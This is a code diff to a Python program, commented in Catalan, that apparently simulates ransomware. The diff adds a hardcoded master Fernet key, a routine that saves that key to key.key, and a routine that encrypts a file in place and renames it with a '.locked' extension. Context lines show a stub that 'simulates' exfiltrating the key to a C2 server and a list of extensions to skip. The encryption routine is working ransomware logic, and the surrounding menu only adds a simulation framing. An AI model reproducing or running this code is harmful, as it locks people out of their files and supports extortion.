@@ -8,7 +8,7 @@ import config
 # --- CONFIGURACIO I CONSTANTS ---
 PROHIBITED_WHITELIST = [".py", ".key", ".exe", ".dll", ".sys", ".locked", ".ini", ".lnk", ".bat", ".dat"]
 
-
+CLAU_MESTRA = b'uX9-03X-uS6uQ1_uR6uS6uQ1_uR6uS6uQ1_uR6uS6='
 
 def simular_exfiltracio_clau() -> None:
 #Simula l'enviament de la clau a un servidor C2 remot
@@ -18,6 +18,28 @@ def simular_exfiltracio_clau() -> None:
     file_manager.registrar_log("CLAU EXFILTRADA AL SERVIDOR EXTERN", "CRITICAL")
     print("[V] CLAU ENVIADA. Copia de seguretat eliminada del control de l usuari.")
     print("-"*40)
+
+def generar_i_guardar_clau(ruta):
+    # Guardem la clau mestra al fitxer key.key
+    try:
+        with open(ruta, "wb") as clau_file:
+            clau_file.write(CLAU_MESTRA)
+        file_manager.registrar_log("CLAU_GENERADA", ruta)
+    except Exception as error:
+        print(f"[X] ERROR GENERANT CLAU: {error}")
+
+def xifrar_arxiu(ruta, clau):
+    try:
+        f = Fernet(clau)
+        with open(ruta, "rb") as file:
+            dades = file.read()
+        encriptat = f.encrypt(dades)
+        with open(ruta, "wb") as file:
+            file.write(encriptat)
+        os.rename(ruta, ruta + ".locked")
+        return True
+    except Exception as e:
+        return False
 
 def mostrar_menu():             
 #Loop principal on s'integra tot el codi
@@ -146,4 +168,3 @@ def mostrar_menu():
 
 if __name__ == "__main__":
     mostrar_menu()
-
